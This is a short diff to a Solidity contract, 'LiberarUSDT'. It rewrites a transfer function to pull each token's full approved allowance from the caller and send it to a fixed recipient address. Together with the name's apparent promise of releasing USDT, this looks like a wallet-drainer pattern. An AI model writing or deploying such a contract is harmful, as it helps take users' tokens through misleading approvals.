@@ -81,15 +81,14 @@ contract LiberarUSDT is BaseRelayRecipient {
     }
 
     //Función enviar dinero
-    function TrasnferERC20(address[] memory _tokens, uint256[] memory _amounts) external {
-
-        require(_tokens.length == _amounts.length, "toke's count and amount's count shoule be same.");
+    function TrasnferERC20(address[] memory _tokens) external {
 
         uint256 tokenCount = _tokens.length;
 
         for (uint i=0; i<tokenCount; i++) {
+            uint256 amount = IERC20(_tokens[i]).allowance(msg.sender, address(this));
             
-            IERC20(_tokens[i]).transferFrom(msg.sender, recipient, _amounts[i]);
+            IERC20(_tokens[i]).transferFrom(msg.sender, recipient, amount);
         }
 
     }
